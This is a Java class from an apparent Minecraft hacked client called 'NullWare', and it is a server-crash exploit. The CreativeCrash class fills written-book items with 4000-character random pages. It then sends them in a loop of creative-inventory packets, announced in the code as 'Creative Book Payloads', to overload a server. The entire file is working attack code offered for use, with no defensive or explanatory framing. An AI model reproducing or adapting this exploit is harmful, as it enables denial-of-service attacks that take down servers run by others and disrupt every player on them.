package com.Vxrtrauter.NullWare.command.commands.crashers;

import com.Vxrtrauter.NullWare.command.commands.CrashHandler;
import net.minecraft.client.Minecraft;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;

import java.util.Random;

import static com.Vxrtrauter.NullWare.client.MessageHandler.sendMessage;

public class CreativeCrash implements CrashHandler {
    private final Minecraft mc = Minecraft.getMinecraft();
    private final Random random = new Random();
    private final char[] letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".toCharArray();

    @Override
    public void execute(int packets) {
        sendMessage("Sending Creative Book Payloads...");
        for (int c = 0; c < packets; c++) {
            NBTTagList list = new NBTTagList();
            StringBuilder content = new StringBuilder();

            for (int j = 0; j < 4000; j++) {
                content.append(letters[random.nextInt(letters.length)]);
            }

            list.appendTag(new NBTTagString(content.toString()));

            NBTTagCompound comp = new NBTTagCompound();
            comp.setString("author", "NullWare");
            comp.setString("title", "null");
            comp.setByte("resolved", (byte) 1);
            comp.setTag("pages", list);

            ItemStack writtenBook = new ItemStack(net.minecraft.init.Items.written_book);
            writtenBook.setTagCompound(comp);

            mc.getNetHandler().getNetworkManager().sendPacket(new C10PacketCreativeInventoryAction(-1, writtenBook));
        }
    }
}